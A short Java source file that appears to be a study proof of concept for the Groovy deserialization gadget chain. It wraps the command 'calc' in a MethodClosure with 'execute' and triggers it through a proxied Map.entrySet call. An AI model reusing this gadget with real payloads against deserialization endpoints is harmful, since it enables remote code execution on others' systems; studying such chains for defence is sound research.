package org.example.groovy;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.Array;
import java.lang.reflect.Proxy;
import java.util.Map;

public class GroovyTest {
    static String command = "calc";

    public static void main(String[] args) {
        MethodClosure methodClosure = new MethodClosure(command,"execute");
        final ConvertedClosure closure = new ConvertedClosure(methodClosure,"entrySet");

        Class<?>[] allinterfaces = (Class<?>[]) Array.newInstance(Class.class,1);

        allinterfaces[0] = Map.class;

        Object o = Proxy.newProxyInstance(GroovyTest.class.getClassLoader(),allinterfaces,closure);

        //类名.class.cast() 强制转换
        final Map map = Map.class.cast(o);

        map.entrySet();

    }
}
